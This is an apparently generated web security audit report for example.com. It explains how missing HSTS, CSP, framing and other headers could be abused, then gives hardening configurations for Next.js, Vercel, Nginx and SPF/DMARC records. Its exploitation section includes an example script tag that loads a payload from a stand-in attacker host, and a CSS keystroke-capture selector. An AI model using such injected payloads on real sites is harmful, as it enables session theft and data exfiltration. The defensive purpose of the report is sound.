# AUDIT REPORT: `https://example.com`

---

## 1. BRUTAL POSTURE SUMMARY & RISK SCORE

### **POSTURE SCORE: 52 / 100 — CRITICAL ARCHITECTURAL NEGLECT**

```
[+] TLS Cryptography:   95/100 (Strong Ciphers / Modern TLS 1.3)
[-] Transport Integrity: 10/100 (Zero HSTS Enforcement)
[-] Browser Sandboxing:  05/100 (Completely Naked Client Defense Layer)
[+] DNS Identity:        75/100 (Base Records Present; Policy Enforcement Unverified)
```

### The Immediate Attack Surface
Your infrastructure operates under the dangerous illusion of security. While your edge terminates with modern TLS 1.3 and strong AES-GCM suites, **your application layer is defenseless against client-side execution attacks and downgrade vectors**. 

You are serving a naked transport session. By failing to emit every foundational browser security header, you offload security decisions entirely to client-side heuristics. A single DOM or Reflected Cross-Site Scripting (XSS) flaw in your application code results in an instant, unmitigated session takeover, data exfiltration, or UI redressing campaign.

---

## 2. TECHNICAL VULNERABILITY BREAKDOWN

### A. Total Absence of HSTS (`Strict-Transport-Security`)
* **Exploitation Mechanics:** TLS 1.3 is useless if the initial connection handshake can be intercepted. An adversary on a local network, rogue AP, or compromised upstream hop can execute an **SSL Stripping attack** (e.g., via `mitmproxy` or `bettercap`). 
* Because the browser is never instructed to pin HTTPS via HSTS (`max-age` + `includeSubDomains` + `preload`), the initial `GET http://example.com` plaintext request is intercepted, downgraded, and proxies the downstream victim over raw HTTP while maintaining a TLS connection to your origin.

### B. Unrestricted Client-Side Execution (Missing `Content-Security-Policy`)
* **Exploitation Mechanics:** Without a CSP, the browser assumes an implicit default: execute *everything*. An adversary who successfully injects arbitrary markup can:
  1. Pull remote execution payloads from arbitrary adversarial C2 servers (`<script src="https://evil.attacker/payload.js">`).
  2. Exfiltrate `document.cookie` (if not strictly HTTP-only), local storage, session state, and DOM-rendered PII using background `fetch()` or `navigator.sendBeacon()` primitives.
  3. Inline arbitrary styles to alter visual layout, inject phish forms, or capture keystrokes via CSS injection (`input[value^="a"] { background: url(...) }`).

### C. UI Redressing & Clickjacking (Missing `X-Frame-Options` & CSP `frame-ancestors`)
* **Exploitation Mechanics:** The target website permits framing inside arbitrary `<iframe sandbox="...">` elements across any external domain. 
* An attacker renders `example.com` under a transparent 100% viewport iframe on an adversarial site, overlaying misleading buttons directly over sensitive actions (e.g., "Delete Account", "Authorize API Client", "Update Email Address"). The victim, believing they are clicking an external decoy element, issues authenticated state-changing actions on your origin.

### D. MIME Type Confusion / Sniffing (Missing `X-Content-Type-Options: nosniff`)
* **Exploitation Mechanics:** When users or third-party feeds can upload or render content on this domain (avatars, images, attachments, or text documents), absence of `nosniff` instructs legacy and modern browsers to ignore the declared `Content-Type` header and sniff the byte-stream payload. 
* An adversary uploads a polyglot file (e.g., an image file containing executable HTML/JS payloads inside metadata/bytes). The browser executes it as script in the origin's context.

### E. Sensitive Context & Token Leakage (Missing `Referrer-Policy`)
* **Exploitation Mechanics:** By defaulting to browser fallback rules, whenever a user clicks an external link or a third-party asset is requested, the browser leaks the full originating URL in the `Referer` request header. 
* If your application includes session tokens, transaction IDs, reset identifiers, or sensitive internal path routing within URL query strings (`?token=...`, `?ref=...`), these are persistently logged inside third-party access logs and metrics aggregators.

### F. Peripheral Hardware Exploitation (Missing `Permissions-Policy`)
* **Exploitation Mechanics:** By default, embedded iframes, widgets, or compromised third-party scripts (analytics, customer support chatboxes) can trigger and request permissions for the camera, microphone, geolocation, screen capture, and payment APIs.
* A compromise in any integrated third-party script grants immediate capability to trigger browser permission prompts or execute fingerprinting APIs under your domain's trust profile.

---

## 3. PRODUCTION-READY HARDENING PATCHES

### Next.js (`next.config.mjs`)
Drop this directly into your modern Next.js configuration to enforce deep-defense headers across all routes:

```javascript
/** @type {import('next').NextConfig} */
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=63072000; includeSubDomains; preload'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=(), browsing-topics=(), payment=()'
          },
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self'",
              "frame-ancestors 'none'",
              "form-action 'self'",
              "base-uri 'self'",
              "object-src 'none'",
              "upgrade-insecure-requests"
            ].join('; ')
          }
        ]
      }
    ];
  }
};

export default nextConfig;
```

---

### Vercel (`vercel.json`)
If routing via Vercel Edge/Serverless layers without Next.js middleware handling headers:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=63072000; includeSubDomains; preload"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "camera=(), microphone=(), geolocation=(), browsing-topics=(), payment=()"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; object-src 'none'; upgrade-insecure-requests;"
        }
      ]
    }
  ]
}
```

---

### Nginx (`nginx.conf`)
Ensure these headers are injected at the `server` block level. Note the use of `always` to ensure headers are preserved during non-2xx/error responses:

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    # SSL Layer Configuration
    ssl_protocols TLSv1.3;
    ssl_ciphers TLS_AES_256_GCM_SHA384;
    ssl_prefer_server_ciphers off;

    # Stripping Engine Signature
    server_tokens off;

    # Defense In Depth Security Headers
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), browsing-topics=(), payment=()" always;
    
    # Modern Strict Content Security Policy
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; object-src 'none'; upgrade-insecure-requests;" always;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

---

### DNS Records (SPF & DMARC Enforcement)
While the scan confirmed presence of records, ensure you aren't running permissive `~all` or `p=none` monitor-only policies. Apply authoritative rejection records:

#### **SPF Record**
If your root domain is **NOT** sending email directly via an on-premise MTA (adapt includes to your actual providers, e.g., Google, SendGrid):
```text
Host:   @
Type:   TXT
Value:  v=spf1 include:_spf.mx.cloudflare.net -all
```
*(If the domain sends NO email whatsoever, immediately lock it down to prevent spoofing: `v=spf1 -all`)*

#### **DMARC Record**
Cease listening mode. Move to strict rejection and aggregate forensic reporting:
```text
Host:   _dmarc.example.com
Type:   TXT
Value:  v=DMARC1; p=reject; sp=reject; adkim=s; aspf=s; pct=100; rua=mailto:dmarc-reports@example.com; ruf=mailto:dmarc-forensics@example.com;
```